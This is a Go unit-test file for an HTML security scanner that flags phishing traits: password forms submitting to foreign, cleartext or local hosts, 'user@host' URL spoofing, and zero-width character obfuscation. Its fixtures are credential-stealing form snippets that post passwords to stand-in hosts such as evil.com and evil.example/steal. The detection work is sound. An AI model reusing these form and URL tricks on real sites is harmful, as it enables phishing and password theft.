package scanner

import (
	"strings"
	"testing"
)

func TestDomainOf(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://www.jnu.ac.kr/", "www.jnu.ac.kr"},
		{"http://a.com:8080/x?y", "a.com"},
		{"//cdn.example.com/x.js", "cdn.example.com"},
		{"https://evil.com@bank.com/login", "bank.com"},
		{"https://bank.com@evil.com/login", "evil.com"},
		{"/relative/path", ""},
		{"", ""},
	}
	for _, c := range cases {
		if got := domainOf(c.in); got != c.want {
			t.Errorf("domainOf(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestFormOrigin(t *testing.T) {
	const page = "https://bank.example.com/login"
	const code = "cross-origin-password-form"
	cases := []struct {
		name string
		html string
		want int
	}{
		{"외부도메인+비밀번호", `<form action="https://evil.com/x"><input type=password></form>`, 1},
		{"상대경로", `<form action="/login"><input type=password></form>`, 0},
		{"같은도메인", `<form action="https://bank.example.com/x"><input type=password></form>`, 0},
		{"비밀번호없음", `<form action="https://evil.com/x"><input type=text></form>`, 0},
		{"form안닫힘", `<form action="https://evil.com/x"><input type=password>`, 1},
		{"대문자타입", `<form action="https://evil.com/x"><input TYPE=PASSWORD></form>`, 1},
		{"유저정보속임", `<form action="https://bank.example.com@evil.com/x"><input type=password></form>`, 1},
		{"폼밖의비밀번호", `<input type=password><form action="https://evil.com/x"></form>`, 0},
		{"중첩form", `<form action="https://evil.com/x"><form action="/safe"><input type=password></form></form>`, 1},
		{"div속깊이", `<form action="https://evil.com/x"><div><p><input type=password>`, 1},
		{"표속", `<form action="https://evil.com/x"><table><tr><td><input type=password>`, 1},
		// formaction — 비밀번호와 버튼은 어느 쪽이 먼저 와도 같은 폼이면 판정한다
		{"formaction외부", `<form action="/login"><input type=password><button formaction="https://evil.com/x">로그인</button></form>`, 1},
		{"버튼이먼저", `<form action="/login"><button formaction="https://evil.com/x">로그인</button><input type=password></form>`, 1},
		{"action과formaction둘다외부", `<form action="https://evil.com/a"><input type=password><button formaction="https://evil2.com/b">x</button></form>`, 2},
		{"비밀번호없는폼", `<form action="/search"><input name=q><button formaction="https://evil.com/x">검색</button></form>`, 0},
		{"type=button", `<form action="/login"><input type=password><button type=button formaction="https://evil.com/x">x</button></form>`, 0},
		{"다른폼의버튼", `<form action="/login"><input type=password></form><form action="/s"><button formaction="https://evil.com/x">x</button></form>`, 0},
		// 한 폼·한 전송지는 한 건 — 비밀번호 확인 칸이 있어도 조치는 하나다
		{"비밀번호둘", `<form action="https://evil.com/x"><input type=password><input type=password></form>`, 1},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, page, code); got != c.want {
				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

func TestZeroWidth(t *testing.T) {
	const code = "zero-width"
	cases := []struct {
		name string
		html string
		want int
	}{
		{"정상", "<p>정상 텍스트</p>", 0},
		{"텍스트", "<p>보이지\u200b않음</p>", 1},
		{"속성값", "<a href=\"a\u200bb.com\">x</a>", 1},
		{"BOM", "<p>\uFEFF</p>", 1},
		// 맞춤법상 필수인 자리 — 난독화가 아니다
		{"페르시아어 ZWNJ", "<p>\u0627\u0686\u200c\u062a\u06cc</p>", 0},
		{"이모지 ZWJ", "<p>\U0001F9CD\u200d\u2642\uFE0F</p>", 0},
		{"이모지 ZWJ + VS16", "<p>\U0001F9CD\u200d\uFE0F</p>", 0},
		{"아랍어 속성값", "<a title=\"\u0627\u0686\u200c\u062a\">x</a>", 0},
		{"힌디어 ZWNJ", "<p>\u0915\u094d\u200c\u0937</p>", 0},
		// 쓸 이유가 없는 자리
		{"라틴 사이 ZWNJ", "<p>ad\u200cmin</p>", 1},
		{"숫자 사이 ZWJ", "<p>1\u200d2</p>", 1},
		{"한쪽만 아랍어", "<p>a\u200c\u062a</p>", 1},
		{"이모지에 ZWNJ", "<p>\U0001F9CD\u200c\u2642</p>", 0},
		{"연결 문자 사이 ZWSP", "<p>\u0627\u200b\u062a</p>", 1},
		{"WORD JOINER 경계", "<p>+17\u2060°</p>", 0},
		{"WORD JOINER 글자 사이", "<p>ad\u2060min</p>", 1},
		{"제로폭 둘 연속", "<p>a\u200b\u200bb</p>", 1},
		{"텍스트 끝", "<p>제목\u200b</p>", 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, "", code); got != c.want {
				t.Errorf("%q → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

// action 이면 비밀번호 입력, 비밀번호 뒤에 온 formaction이면 버튼.
func TestCredentialOffset(t *testing.T) {
	const page = "https://bank.example.com/"
	cases := []struct{ name, html, at string }{
		{"action은입력", `<form action="https://evil.com/x"><input type=password></form>`, "<input"},
		{"formaction은버튼", `<form action="/login"><input type=password><button formaction="https://evil.com/x">x</button></form>`, "<button"},
		{"버튼이먼저면입력", `<form action="/login"><button formaction="https://evil.com/x">x</button><input type=password></form>`, "<input"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f, ok := findFirst(c.html, page, "cross-origin-password-form")
			if !ok {
				t.Fatal("발견되지 않음")
			}
			if !strings.HasPrefix(c.html[f.Offset:], c.at) {
				t.Errorf("위치 %q, want %s…", c.html[f.Offset:], c.at)
			}
		})
	}
}

// form="id"는 문서 어디에 있든 그 폼에 붙는다
func TestRemoteFormOwner(t *testing.T) {
	const page = "https://a.com/"
	cases := []struct {
		name, html, code string
		want             int
	}{
		{"원격 외부 도메인", `<form id="f" action="https://evil.example/steal"></form><input type=password form="f">`,
			"cross-origin-password-form", 1},
		{"원격 평문", `<form id="f" action="http://a.com/login"></form><input type=password form="f">`,
			"cleartext-credentials", 1},
		{"원격 로컬", `<form id="f" action="http://127.0.0.1/x"></form><input type=password form="f">`,
			"local-credential-post", 1},
		{"비밀번호가 폼보다 먼저", `<input type=password form="f"><form id="f" action="https://evil.example/"></form>`,
			"cross-origin-password-form", 1},
		{"원격 버튼의 formaction", `<form id="f" action="/ok"><input type=password></form><button form="f" formaction="https://evil.example/">go</button>`,
			"cross-origin-password-form", 1},
		{"같은 id 가 여럿이면 첫 번째", `<form id="f" action="https://evil.example/"></form><form id="f" action="/ok"></form><input type=password form="f">`,
			"cross-origin-password-form", 1},
		// 음성
		{"없는 id 는 주인이 없다", `<input type=password form="nope">`, "cross-origin-password-form", 0},
		{"같은 도메인", `<form id="f" action="/login"></form><input type=password form="f">`, "cross-origin-password-form", 0},
		{"속성 없는 폼 밖 비밀번호", `<input type=password>`, "cross-origin-password-form", 0},
		{"중첩 form 은 id 로 등록되지 않는다", `<form action="/a"><form id="f" action="https://evil.example/"></form></form><input type=password form="f">`,
			"cross-origin-password-form", 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, page, c.code); got != c.want {
				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}
